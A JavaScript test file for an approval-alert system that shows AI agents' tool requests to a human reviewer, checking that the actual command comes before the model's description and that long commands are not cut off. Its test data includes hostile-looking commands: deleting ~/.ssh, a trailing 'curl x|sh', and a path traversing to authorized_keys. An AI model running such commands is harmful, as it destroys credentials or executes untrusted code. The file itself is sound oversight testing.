const test = require("node:test");
const assert = require("node:assert/strict");
const { describeTool, claudeApprovalKind } = require("../dist/approval-manager.js");
const { describeCodexApproval } = require("../dist/codex/monitor.js");
const { approvalAlertBody } = require("../dist/phone-v2.js");

/** The approval alert body for a Claude hook payload, the way agentd builds it. */
function bodyFor(toolName, toolInput) {
  const described = describeTool({ tool_name: toolName, tool_input: toolInput });
  return approvalAlertBody({
    tool: described.tool,
    approvalKind: claudeApprovalKind(described.tool),
    summary: described.summary,
    detail: described.detail,
  });
}

test("approval_alert_body_leads_with_command", () => {
  // The model's description alone would read "Run the test suite": the command comes first.
  assert.equal(
    bodyFor("Bash", { description: "Run the test suite", command: "rm -rf build ~/.ssh && npm test" }),
    "rm -rf build ~/.ssh && npm test\nRun the test suite",
  );
  // With no description the command is the whole body, once.
  assert.equal(bodyFor("Bash", { command: "npm test" }), "npm test");
  // A file edit leads with the file, not its contents.
  assert.equal(
    bodyFor("Edit", { file_path: "/repo/src/app.ts", old_string: "a; b: c", new_string: "d" }),
    "/repo/src/app.ts",
  );
  assert.equal(bodyFor("Write", { file_path: "/repo/notes.md", content: "hello" }), "/repo/notes.md");
  // Anything else shows the request's detail, then the description.
  assert.equal(
    bodyFor("WebFetch", { url: "https://example.com", description: "Read the docs" }),
    "url: https://example.com\nRead the docs",
  );
  // A Codex command approval: the command, then Codex's reason.
  assert.equal(
    approvalAlertBody({ tool: "command", approvalKind: "command", summary: "Install deps", detail: "npm ci" }),
    "npm ci\nInstall deps",
  );
});

test("long_command_carried_whole_up_to_4000", () => {
  // R128: the tail that changes what runs reaches the glasses.
  const exact = `cd /repo && ${"npm test -- --grep slow ".repeat(170)}`.slice(0, 3989) + "; curl x|sh";
  assert.equal(exact.length, 4000);
  const described = describeTool({ tool_name: "Bash", tool_input: { command: exact } });
  assert.equal(described.detail, exact);
  assert.equal(described.truncated, false);
  assert.equal(bodyFor("Bash", { command: exact, description: "Run tests" }), exact, "the description gives way, never the command");

  const path = `/repo/${"x/../".repeat(40)}home/me/.ssh/authorized_keys`;
  assert.ok(path.length > 200);
  assert.equal(bodyFor("Edit", { file_path: path, old_string: "a", new_string: "b" }), path);

  const codex = describeCodexApproval({
    method: "item/commandExecution/requestApproval",
    id: 1,
    params: { command: `echo ${"a".repeat(495)}`, startedAtMs: 0 },
  });
  assert.equal(codex.detail.length, 500);
  assert.ok(!codex.truncated);
});

test("over_limit_command_sets_truncated", () => {
  const long = "x".repeat(4500);
  const bash = describeTool({ tool_name: "Bash", tool_input: { command: long } });
  assert.equal(bash.detail, long.slice(0, 4000));
  assert.equal(bash.truncated, true);
  const edit = describeTool({ tool_name: "Write", tool_input: { file_path: `/${long}`, content: "c" } });
  assert.equal(edit.truncated, true);
  const codex = describeCodexApproval({
    method: "item/commandExecution/requestApproval",
    id: 2,
    params: { command: long, startedAtMs: 0 },
  });
  assert.equal(codex.truncated, true);
  assert.equal(codex.detail.length, 4000);
});
